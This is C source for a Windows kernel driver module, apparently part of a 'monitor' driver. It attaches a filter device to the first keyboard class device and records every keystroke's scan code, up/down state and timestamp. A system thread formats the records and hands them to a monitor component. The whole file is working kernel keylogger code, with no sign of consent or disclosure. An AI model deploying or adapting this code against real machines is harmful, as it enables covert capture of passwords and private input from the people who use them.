#include <inc/keybrd.h>
#include <inc/klogger.h>
#include <inc/monitor.h>

#include <Ntstrsafe.h>
#include <ntddkbd.h>
#define __SUBCOMPONENT__ "keybrd"

#define KBD_BUFF_TAG 'kbds'
#define FMT_BUFF_TAG 'kbdp'

PCHAR g_ScanCodeMap[] =  {"UNK", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", 
                        "9", "0", "-", "=", "bs", "Tab", "Q", "W", "E", "R", 
                        "T", "Y", "U", "I", "O", "P", "[", "]", "ENTER", "CTRL", 
                        "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", 
                        "'", "`", "LSHIFT", "\\", "Z", "X", "C", "V", "B", "N", 
                        "M", ",", ".", "/", "RSHIFT", "PrtSc", "Alt", "Space", "Caps", "F1",
                        "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "Num",
                        "Scroll", "Home", "Up", "PgUp", "Num-", "Left", "Center", "Right", "Num+", "End",
                        "Down", "PgDn", "Ins", "Del"};

STRING g_ScanCodeMapS[RTL_NUMBER_OF(g_ScanCodeMap)];

VOID
    MapScanCodeInit()
{
    ULONG i;
    for (i = 0; i < RTL_NUMBER_OF(g_ScanCodeMap); i++) {
        RtlInitString(&g_ScanCodeMapS[i], g_ScanCodeMap[i]);
    }
}

PSTRING
    MapScanCode(USHORT ScanCode)
{
    if (ScanCode < RTL_NUMBER_OF(g_ScanCodeMapS)) {
        return &g_ScanCodeMapS[ScanCode];
    } else {
        return &g_ScanCodeMapS[0];
    }
}




VOID KbdDeref(PKBD_CONTEXT Kbd)
{
    if (0 == InterlockedDecrement(&Kbd->RefCount)) {
        KeSetEvent(&Kbd->ShutdownEvent, 2, FALSE);
    }
}

BOOLEAN KbdRef(PKBD_CONTEXT Kbd)
{
    if (Kbd->Shutdown)
        return FALSE;

    InterlockedIncrement(&Kbd->RefCount);
    if (Kbd->Shutdown) {
        KbdDeref(Kbd);
        return FALSE;
    }

    return TRUE;
}

VOID 
    KbdBuffInit(PKBD_BUFF_ENTRY Entry, PVOID Bytes, ULONG BytesCount)
{
    Entry->Bytes = Bytes;
    Entry->BytesCount = BytesCount;
    Entry->BytesUsed = 0;
}

VOID
    KbdBuffDelete(PKBD_BUFF_ENTRY Entry)
{
    ExFreePoolWithTag(Entry, KBD_BUFF_TAG);
}

PKBD_BUFF_ENTRY
    KbdBuffCreate(ULONG BytesCount)
{
    PKBD_BUFF_ENTRY BuffEntry = NULL;
    
    BuffEntry = (PKBD_BUFF_ENTRY)ExAllocatePoolWithTag(NonPagedPool, sizeof(KBD_BUFF_ENTRY) + BytesCount, KBD_BUFF_TAG);
    if (BuffEntry == NULL) {
        __debugbreak();
        return NULL;
    }

    KbdBuffInit(BuffEntry, (PVOID)((ULONG_PTR)BuffEntry + sizeof(KBD_BUFF_ENTRY)), BytesCount);
    return BuffEntry;
}

PKBD_BUFF_ENTRY
	KbdBuffGet(PKBD_CONTEXT Kbd, BOOLEAN bWait)
{
    PVOID pBytes = NULL;
    PKBD_BUFF_ENTRY BuffEntry = NULL;
    
    if (!KbdRef(Kbd))
        return NULL;

    if (bWait)
        KeWaitForSingleObject(&Kbd->BuffEntryEvent, Executive, KernelMode, FALSE, NULL);

    KeAcquireGuardedMutex(&Kbd->BuffEntryLock);
    if (!IsListEmpty(&Kbd->BuffEntryList)) {
        PLIST_ENTRY ListEntry;
        ListEntry = RemoveHeadList(&Kbd->BuffEntryList);
        BuffEntry = CONTAINING_RECORD(ListEntry, KBD_BUFF_ENTRY, ListEntry);
    } else {
        BuffEntry = NULL;
    }

    KeReleaseGuardedMutex(&Kbd->BuffEntryLock);

    KbdDeref(Kbd);
    return BuffEntry;
}

VOID
    KbdBuffSaveBuffer(PKBD_CONTEXT Kbd, PVOID Buffer, ULONG Length)
{
    PKBD_BUFF_ENTRY BuffEntry = NULL;
    ULONG BytesRequired = (Length > KBD_BUFF_BYTES_COUNT) ? Length : KBD_BUFF_BYTES_COUNT;

    KeAcquireGuardedMutex(&Kbd->BuffEntryLock);
    if (IsListEmpty(&Kbd->BuffEntryList)) {
        BuffEntry = KbdBuffCreate(BytesRequired);
    } else {
        PLIST_ENTRY ListEntry;
        ListEntry = RemoveTailList(&Kbd->BuffEntryList);
        BuffEntry = CONTAINING_RECORD(ListEntry, KBD_BUFF_ENTRY, ListEntry);
        if (Length > (BuffEntry->BytesCount - BuffEntry->BytesUsed)) {
            InsertTailList(&Kbd->BuffEntryList, &BuffEntry->ListEntry);
            BuffEntry = KbdBuffCreate(BytesRequired);
        }
    }

    if (BuffEntry != NULL) {
        RtlCopyMemory((PVOID)((ULONG_PTR)BuffEntry->Bytes + BuffEntry->BytesUsed), Buffer, Length);
        BuffEntry->BytesUsed+= Length;
        InsertTailList(&Kbd->BuffEntryList, &BuffEntry->ListEntry);
        KeSetEvent(&Kbd->BuffEntryEvent, 2, FALSE);
    }

    KeReleaseGuardedMutex(&Kbd->BuffEntryLock);
    return;
}

NTSTATUS
    KbdKeyToBuff(PKBD_KEY Key, LPTSTR Buff, ULONG Length, ULONG *pRemains)
{
	size_t Remains = (size_t)Length;
    NTSTATUS Status;
    
    Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "KEY=%s;%x;%x;", Key->Str->Buffer, Key->MakeCode, Key->Flags);
    if (!NT_SUCCESS(Status)) {
        KLog(LError, "RtlStringCchPrintfExA err %x", Status);
        goto cleanup;
    }

    Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%02d:%02d:%02d.%03d;",
        Key->TimeFields.Hour, Key->TimeFields.Minute, Key->TimeFields.Second, Key->TimeFields.Milliseconds);
    if (!NT_SUCCESS(Status)) {
        KLog(LError, "RtlStringCchPrintfExA err %x", Status);
        goto cleanup;
    }

    if (Key->Flags & KEY_BREAK) {
        Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%s;", "up");
        if (!NT_SUCCESS(Status)) {
            KLog(LError, "RtlStringCchPrintfExA err %x", Status);
            goto cleanup;
        }
    } else {
        Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%s;", "down");   
        if (!NT_SUCCESS(Status)) {
            KLog(LError, "RtlStringCchPrintfExA err %x", Status);
            goto cleanup;
        }
    }
    
    if (Key->Flags & KEY_E0) {
        Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%s;", "E0");    
        if (!NT_SUCCESS(Status)) {
            KLog(LError, "RtlStringCchPrintfExA err %x", Status);
            goto cleanup;
        }
    }
    
    if (Key->Flags & KEY_E1) {
        Status = RtlStringCchPrintfExA(Buff, Remains, &Buff, &Remains, 0, "%s;", "E1"); 
        if (!NT_SUCCESS(Status)) {
            KLog(LError, "RtlStringCchPrintfExA err %x", Status);
            goto cleanup;
        }        
    }
    Status = STATUS_SUCCESS;
cleanup:
    *pRemains = (ULONG)Remains;
    return Status;
}

VOID
    KbdSaveKbdBufContent(PKBD_CONTEXT Kbd, PKBD_BUF Buf)
{
    ULONG i;
    KIRQL Irql;
    ULONG Remains;
    NTSTATUS Status;

    for (i = 0; i < Buf->Length; i++) {
        Kbd->FmtPage[PAGE_SIZE-1] = 0;
        Status = KbdKeyToBuff(&Buf->Keys[i], Kbd->FmtPage, PAGE_SIZE, &Remains);
        if (NT_SUCCESS(Status)) {
            KbdBuffSaveBuffer(Kbd, Kbd->FmtPage, PAGE_SIZE - Remains);
        }
    }
}

PKBD_BUF KbdAllocBuffer(PKBD_CONTEXT Kbd)
{
    KIRQL Irql;
    PLIST_ENTRY ListEntry;
    PKBD_BUF Buff = NULL;

    KeAcquireSpinLock(&Kbd->Lock, &Irql);
    if (!IsListEmpty(&Kbd->FreeList)) {
        ListEntry = RemoveHeadList(&Kbd->FreeList);
        Buff = CONTAINING_RECORD(ListEntry, KBD_BUF, ListEntry);
        Buff->Length = 0;
    }
    KeReleaseSpinLock(&Kbd->Lock, Irql);
    return Buff;
}

VOID KbdFreeBuffer(PKBD_CONTEXT Kbd, PKBD_BUF Buff)
{
    KIRQL Irql;
    KeAcquireSpinLock(&Kbd->Lock, &Irql);
    InsertHeadList(&Kbd->FreeList, &Buff->ListEntry);
    KeReleaseSpinLock(&Kbd->Lock, Irql);
}


VOID KbdThreadStop(PKBD_CONTEXT Kbd)
{
    Kbd->ThreadStop = TRUE;
    KeSetEvent(&Kbd->FlushEvent, 2, FALSE);

    if (Kbd->ThreadHandle != NULL) {
        ZwWaitForSingleObject(Kbd->ThreadHandle, FALSE, NULL);
        ZwClose(Kbd->ThreadHandle);
        Kbd->ThreadHandle = NULL;
    }

    if (Kbd->Thread != NULL) {
        KeWaitForSingleObject(Kbd->Thread, Executive, KernelMode, FALSE, NULL);
        ObDereferenceObject(Kbd->Thread);
        Kbd->Thread = NULL;
    }
}

VOID KbdThreadRoutine(PVOID Context)
{
    PKBD_CONTEXT Kbd = (PKBD_CONTEXT)Context;
    NTSTATUS Status;
    KIRQL Irql;
    LIST_ENTRY FlushQueue;
    PKBD_BUF Buff;
    PLIST_ENTRY ListEntry;
    ULONG cBufs;
	PKBD_BUFF_ENTRY BufEntry = NULL;

    KLog(LInfo, "Kbd thread started %p\n", PsGetCurrentThread());

    while (TRUE) {
        Status = KeWaitForSingleObject(&Kbd->FlushEvent, Executive, KernelMode, FALSE, NULL);
        if (!NT_SUCCESS(Status)) {
            KLog(LError, "KeWaitForSingleObject failed with err %x\n", Status);
        }

        InitializeListHead(&FlushQueue);
		cBufs = 0;

        KeAcquireSpinLock(&Kbd->Lock, &Irql);
        while (!IsListEmpty(&Kbd->FlushQueue)) {
            ListEntry = RemoveHeadList(&Kbd->FlushQueue);
            InsertTailList(&FlushQueue, ListEntry);
        }
        KeReleaseSpinLock(&Kbd->Lock, Irql);

        while (!IsListEmpty(&FlushQueue)) {
            ListEntry = RemoveHeadList(&FlushQueue);
            Buff = CONTAINING_RECORD(ListEntry, KBD_BUF, ListEntry);
            
            KbdSaveKbdBufContent(Kbd, Buff);
			cBufs++;
            KbdFreeBuffer(Kbd, Buff);
        }

		while ((!Kbd->ThreadStop) && (cBufs > 0) && ((BufEntry = KbdBuffGet(Kbd, FALSE)) != NULL)) {
			MonitorSendKbdBuf(MonitorGetInstance(), BufEntry);
		}

        if (Kbd->ThreadStop)
            break;
    }

    KLog(LInfo, "Kbd thread stopped %p\n", PsGetCurrentThread());
}

NTSTATUS KbdThreadStart(PKBD_CONTEXT Kbd)
{
    NTSTATUS Status;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(
        &ObjectAttributes, NULL,
        OBJ_KERNEL_HANDLE,
        NULL,NULL
        );

    Status = PsCreateSystemThread(	&Kbd->ThreadHandle,
                                    THREAD_ALL_ACCESS,
                                    &ObjectAttributes,
                                    0L,
                                    NULL,
                                    KbdThreadRoutine,
                                    Kbd
                                    );

    if (!NT_SUCCESS(Status)) {
        KLog(LError, "PsCreateSystemThread failed with err %x\n", Status);
        return Status;
    }

    Status = ObReferenceObjectByHandle(	Kbd->ThreadHandle,
                                        THREAD_ALL_ACCESS,
                                        *PsThreadType,
                                        KernelMode,
                                        &Kbd->Thread,
                                        NULL
                                        );
    if (!NT_SUCCESS(Status)) {
        KLog(LError, "ObReferenceObjectByHandle failed with err %x\n", Status);
        KbdThreadStop(Kbd);
        return Status;
    }

    ZwClose(Kbd->ThreadHandle);
    Kbd->ThreadHandle = NULL;

    return STATUS_SUCCESS;
}


NTSTATUS 
    KbdAttach(PKBD_CONTEXT Kbd)
{
    CCHAR                   ntNameBuffer[64];
    STRING                  ntNameString;
    UNICODE_STRING          ntUnicodeString;
    NTSTATUS                Status;
    //
    // Only hook onto the first keyboard's chain.
    //
    RtlStringCbPrintfA(ntNameBuffer, 64, "\\Device\\KeyboardClass0" );
    RtlInitAnsiString( &ntNameString, ntNameBuffer );
    RtlAnsiStringToUnicodeString( &ntUnicodeString, &ntNameString, TRUE );
    //
    // Create device object for the keyboard.
    //
    Status = IoCreateDevice( Kbd->DriverObject,
                       0,
                       NULL,
                       FILE_DEVICE_KEYBOARD,
                       0,
                       FALSE,
                       &Kbd->HookDeviceObject );
    if( !NT_SUCCESS(Status) ) {
        KLog(LError, "failed to create hook device object! %x", Status);
        RtlFreeUnicodeString( &ntUnicodeString );
        return Status;
    }
    //
    // Keyboard uses buffered I/O so we must as well.
    //

    Kbd->HookDeviceObject->Flags |= DO_BUFFERED_IO;

    //
    // Attach to the keyboard chain.
    //

    Status = IoAttachDevice( Kbd->HookDeviceObject, &ntUnicodeString, &Kbd->KbdDeviceObject);
    if ( !NT_SUCCESS(Status) ) {
        KLog(LError, "IoAttachDevice with keyboard failed! %x", Status);
        IoDeleteDevice( Kbd->HookDeviceObject );
        Kbd->HookDeviceObject = NULL;
        RtlFreeUnicodeString( &ntUnicodeString );
        return Status;
    }
    //
    // Done! Just free our string and be on our way...
    //

    RtlFreeUnicodeString( &ntUnicodeString );

    KLog(LInfo, "Successfully connected to keyboard device");
    //
    // This line simply demonstrates how a driver can print
    // stuff to the bluescreen during system initialization.
    //

    return STATUS_SUCCESS;
}

NTSTATUS 
    KbdReadComplete( 
        IN PDEVICE_OBJECT DeviceObject, 
        IN PIRP Irp,
        IN PVOID Context
        )
{
    PIO_STACK_LOCATION        IrpSp;
    PKEYBOARD_INPUT_DATA      KeyData;
    ULONG                      numKeys, i;
    PKBD_CONTEXT Kbd = (PKBD_CONTEXT)Context;
    KIRQL Irql;

    //
    // Request completed - look at the result.
    //

    //KLog(LInfo, "read complete %x", Irp->IoStatus.Status);

    IrpSp = IoGetCurrentIrpStackLocation( Irp );
    if( NT_SUCCESS( Irp->IoStatus.Status ) ) {

        //
        // Do caps-lock down and caps-lock up. Note that
        // just frobbing the MakeCode handles both the up-key
        // and down-key cases since the up/down information is specified
        // seperately in the Flags field of the keyboard input data 
        // (0 means key-down, 1 means key-up).
        //

        KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
        numKeys = (ULONG)Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

        i = 0;
        while (i < numKeys) {
            PKBD_BUF Buf = NULL;
            ULONG j;
            
            Buf = KbdAllocBuffer(Kbd);
            if (Buf == NULL) {
                __debugbreak();
            }

            for (j = 0; j < KBD_BUF_SZ; j++) {
                Buf->Keys[j].MakeCode = KeyData[i].MakeCode;
                Buf->Keys[j].Str = MapScanCode(KeyData[i].MakeCode);
                Buf->Keys[j].Flags = KeyData[i].Flags;
                GetLocalTimeFields(&Buf->Keys[j].TimeFields);
                Buf->Length++;
                //KLog(LInfo, "ScanCode: %x %s key %s", KeyData[i].MakeCode , KeyData[i].Flags ? "Up" : "Down", MapScanCode(KeyData[i].MakeCode));
                i++;
                if (i == numKeys)
                    break;
            }           
            KeAcquireSpinLock(&Kbd->Lock, &Irql);
            InsertTailList(&Kbd->FlushQueue, &Buf->ListEntry);
            KeReleaseSpinLock(&Kbd->Lock, Irql);
            KeSetEvent(&Kbd->FlushEvent, 2, FALSE);
        }
    }

    if ( Irp->PendingReturned ) {
        IoMarkIrpPending( Irp );
    }

    KbdDeref(Kbd);
    return STATUS_SUCCESS;
}

NTSTATUS 
    KbdNotReadComplete( 
        IN PDEVICE_OBJECT DeviceObject, 
        IN PIRP Irp,
        IN PVOID Context
        )
{
    PKBD_CONTEXT Kbd = (PKBD_CONTEXT)Context;
    if ( Irp->PendingReturned ) {
        IoMarkIrpPending( Irp );
    }

    KbdDeref(Kbd);
    return STATUS_SUCCESS;
}

NTSTATUS 
    KbdDispatchGeneral(
		IN PKBD_CONTEXT		Kbd,
        IN PDEVICE_OBJECT   DeviceObject,
        IN PIRP             Irp,
        IN BOOLEAN          *pbHandled
        )
{
    PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(Irp);
    PIO_STACK_LOCATION nextIrpStack    = IoGetNextIrpStackLocation(Irp);

    *pbHandled = FALSE;
//    KLog(LInfo, "DevObj %p Major %x Minor %x", DeviceObject, currentIrpStack->MajorFunction, currentIrpStack->MinorFunction);

    //
    // If this call was directed at the hook device, pass it to 
    // the keyboard class device, else handle it ourselves.
    // 

    if (!KbdRef(Kbd))
        return STATUS_SUCCESS;

    if ((DeviceObject == Kbd->HookDeviceObject) && (Kbd->KbdDeviceObject != NULL)) {
        *nextIrpStack = *currentIrpStack;

        if (currentIrpStack->MajorFunction == IRP_MJ_READ) {
                //KLog(LInfo, "set comp routine for irp %p", Irp);
            IoSetCompletionRoutine( Irp, KbdReadComplete, Kbd, TRUE, TRUE, TRUE );
        } else {
			IoSetCompletionRoutine(Irp, KbdNotReadComplete, Kbd, TRUE, TRUE, TRUE);
        }

        *pbHandled = TRUE;
		return IoCallDriver(Kbd->KbdDeviceObject, Irp);
    } else {
		KbdDeref(Kbd);
        return STATUS_SUCCESS;
    }
}

VOID
	KbdInit(PKBD_CONTEXT Kbd)
{
	KIRQL Irql;
	ULONG Index;

	MapScanCodeInit();

	RtlZeroMemory(Kbd, sizeof(KBD_CONTEXT));
	Kbd->DriverObject = MonitorGetInstance()->DriverObject;

	InitializeListHead(&Kbd->FreeList);
	InitializeListHead(&Kbd->FlushQueue);
	InitializeListHead(&Kbd->BuffEntryList);

	KeInitializeGuardedMutex(&Kbd->BuffEntryLock);
	KeInitializeSpinLock(&Kbd->Lock);
	KeInitializeEvent(&Kbd->FlushEvent, SynchronizationEvent, FALSE);
	KeInitializeEvent(&Kbd->BuffEntryEvent, SynchronizationEvent, FALSE);

	KeAcquireSpinLock(&Kbd->Lock, &Irql);
	for (Index = 0; Index < KBD_BUF_COUNT; Index++)
		InsertHeadList(&Kbd->FreeList, &Kbd->Buffs[Index].ListEntry);
	KeReleaseSpinLock(&Kbd->Lock, Irql);

	KeInitializeEvent(&Kbd->ShutdownEvent, NotificationEvent, FALSE);

}

NTSTATUS
	KbdStart(PKBD_CONTEXT Kbd)
{
	NTSTATUS    Status;
	KLog(LInfo, "started");

	KbdRef(Kbd);
	Kbd->FmtPage = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, FMT_BUFF_TAG);
	if (Kbd->FmtPage == NULL) {
		Status = STATUS_INSUFFICIENT_RESOURCES;
		goto start_failed;
	}

	Status = KbdThreadStart(Kbd);
	if (!NT_SUCCESS(Status)) {
		goto start_failed;
	}

	Status = KbdAttach(Kbd);
	if (!NT_SUCCESS(Status)) {
		goto start_failed;
	}

	Kbd->Shutdown = 0;

	return STATUS_SUCCESS;

start_failed:
	KLog(LInfo, "completed");
	KbdStop(Kbd);
	return Status;
}

VOID
	KbdStop(PKBD_CONTEXT Kbd)
{
	PLIST_ENTRY ListEntry;
	KIRQL Irql;
	PKBD_BUFF_ENTRY BuffEntry;
	ULONG Index;

	KLog(LInfo, "started");
	InterlockedIncrement(&Kbd->Shutdown);
	KbdDeref(Kbd);
	KeWaitForSingleObject(&Kbd->ShutdownEvent, Executive, KernelMode, FALSE, NULL);

	if (Kbd->KbdDeviceObject != NULL) {
		PDEVICE_OBJECT DeviceObject = Kbd->KbdDeviceObject;
		Kbd->KbdDeviceObject = NULL;
		IoDetachDevice(DeviceObject);
	}

	KbdThreadStop(Kbd);

	KeAcquireGuardedMutex(&Kbd->BuffEntryLock);
	while (!IsListEmpty(&Kbd->BuffEntryList)) {
		ListEntry = RemoveHeadList(&Kbd->BuffEntryList);
		BuffEntry = CONTAINING_RECORD(ListEntry, KBD_BUFF_ENTRY, ListEntry);
		KbdBuffDelete(BuffEntry);
	}
	KeReleaseGuardedMutex(&Kbd->BuffEntryLock);

	if (Kbd->FmtPage != NULL) {
		ExFreePoolWithTag(Kbd->FmtPage, FMT_BUFF_TAG);
		Kbd->FmtPage = NULL;
	}

	if (Kbd->HookDeviceObject != NULL) {
		PDEVICE_OBJECT DeviceObject = Kbd->HookDeviceObject;
		Kbd->HookDeviceObject = NULL;
		IoDeleteDevice(DeviceObject);
	}
	KLog(LInfo, "completed");

	KeResetEvent(&Kbd->ShutdownEvent);
	KeResetEvent(&Kbd->FlushEvent);
	KeResetEvent(&Kbd->BuffEntryEvent);

	InitializeListHead(&Kbd->FreeList);
	InitializeListHead(&Kbd->FlushQueue);
	InitializeListHead(&Kbd->BuffEntryList);

	KeAcquireSpinLock(&Kbd->Lock, &Irql);
	for (Index = 0; Index < KBD_BUF_COUNT; Index++)
		InsertHeadList(&Kbd->FreeList, &Kbd->Buffs[Index].ListEntry);
	KeReleaseSpinLock(&Kbd->Lock, Irql);

	Kbd->RefCount = 0;
	KLog(LInfo, "reinited");
}